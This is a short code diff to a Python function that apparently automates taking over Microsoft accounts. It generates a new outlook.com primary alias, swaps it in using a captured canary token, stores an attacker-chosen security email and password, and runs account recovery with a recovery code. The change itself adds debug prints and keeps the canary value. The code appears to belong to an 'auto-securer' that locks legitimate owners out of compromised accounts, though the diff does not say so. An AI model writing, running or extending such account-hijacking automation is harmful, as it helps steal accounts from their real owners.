@@ -137,10 +137,12 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             
                 primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                 print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
-                info = await change_primary_alias(session, primaryEmail, apicanary)
-                if info:
+                change_alias = await change_primary_alias(session, primaryEmail, apicanary)
+                print(f"Primary Value: {change_alias}")
+                if change_alias:
                     accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                     main_email = f"{primaryEmail}@outlook.com"
+                    canary = change_alias[0]
                 else:
                     accountInfo["microsoft"]["email"] = main_email
             else:
@@ -162,6 +164,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             database.add_security_email(security_email, password)
 
             print("[~] - Automaticly Securing Account...")
+            print(f"main_email: {main_email}")
             data = await recover(session, main_email, recovery_code, security_email, password, type)
 
             if data and data != "invalid":
